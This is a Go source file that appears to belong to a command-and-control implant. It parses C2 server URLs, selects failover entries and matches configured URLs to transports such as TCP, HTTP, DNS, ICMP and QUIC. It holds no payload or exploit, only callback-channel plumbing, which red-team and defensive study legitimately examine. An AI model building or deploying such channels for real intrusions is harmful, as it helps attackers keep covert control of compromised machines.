//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"net"
	"net/url"
	"strings"
)

// c2DialHostPort extracts host:port from a C2 URL that may be a full URL
// (http://host:8443/path), a transport URL (tcp://host:4444), a bare
// host:port, or an IPv6 literal ([::1]:8443). Callers must never pass the
// raw URL to net.Dial — http://host:port has too many colons.
//
// If raw contains a comma-separated failover list, only the first segment
// is parsed; pass c2URLAtIndex(...) when a specific entry is wanted.
func c2DialHostPort(raw string) (hostPort string, scheme string, ok bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", "", false
	}
	if i := strings.IndexByte(raw, ','); i >= 0 {
		raw = strings.TrimSpace(raw[:i])
		if raw == "" {
			return "", "", false
		}
	}

	if !strings.Contains(raw, "://") {
		if _, _, err := net.SplitHostPort(raw); err == nil {
			return raw, "", true
		}
		if strings.ContainsAny(raw, "/\\ ") {
			return "", "", false
		}
		return raw, "", true
	}

	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return "", "", false
	}
	return u.Host, strings.ToLower(u.Scheme), true
}

// currentC2Raw is the C2 URL the active index (or C2URL) currently points at.
func currentC2Raw() string {
	if u := c2URLAtIndex(int(currentC2Idx.Load())); u != "" {
		return u
	}
	raw := strings.TrimSpace(C2URL)
	if i := strings.IndexByte(raw, ','); i >= 0 {
		return strings.TrimSpace(raw[:i])
	}
	return raw
}

func currentC2Dial() (hostPort string, scheme string, ok bool) {
	return c2DialHostPort(currentC2Raw())
}

func hostnameFromHostPort(hostPort string) string {
	host, _, err := net.SplitHostPort(hostPort)
	if err != nil {
		return hostPort
	}
	return host
}

func c2UseTLS(scheme string) bool {
	if SkipTLSVerify {
		return true
	}
	switch scheme {
	case "tls", "https", "wss", "grpcs", "mtls":
		return true
	}
	return false
}

func transportSchemes(name string) []string {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "tcp":
		return []string{"tcp", "tls"}
	case "http":
		return []string{"http", "https", "h2c", "ws", "wss"}
	case "dns":
		return []string{"dns"}
	case "icmp":
		return []string{"icmp"}
	case "udp":
		return []string{"udp"}
	case "quic":
		return []string{"quic"}
	default:
		s := strings.ToLower(strings.TrimSpace(name))
		if s == "" {
			return nil
		}
		return []string{s}
	}
}

func schemeMatchesTransport(scheme, transport string) bool {
	if scheme == "" {
		return false
	}
	for _, w := range transportSchemes(transport) {
		if scheme == w {
			return true
		}
	}
	return false
}

// indexOfTransportURL finds a configured C2 URL whose scheme matches the
// named transport. Used when rotating transports so TCP failover dials a
// tcp:// entry instead of the HTTP URL sitting at index 0.
func indexOfTransportURL(name string) (int, bool) {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		_, scheme, ok := c2DialHostPort(C2URL)
		return 0, ok && schemeMatchesTransport(scheme, name)
	}
	for i, u := range urls {
		_, scheme, ok := c2DialHostPort(u)
		if ok && schemeMatchesTransport(scheme, name) {
			return i, true
		}
	}
	return 0, false
}

func urlListHasTransport(name string) bool {
	_, ok := indexOfTransportURL(name)
	return ok
}
